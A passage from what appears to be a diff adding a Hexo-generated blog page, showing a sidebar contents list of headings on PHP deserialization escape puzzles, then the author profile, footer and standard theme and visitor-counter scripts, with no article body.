class="nav-text">extract()函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="nav-number">1.2.2.</span> <span class="nav-text">反序列化字符逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">1.2.3.</span> <span class="nav-text">解题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A2%9E%E9%95%BF%E9%80%83%E9%80%B8"><span class="nav-number">1.3.</span> <span class="nav-text">增长逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">解题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%EF%BC%9A"><span class="nav-number">1.3.2.</span> <span class="nav-text">注：</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_1.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
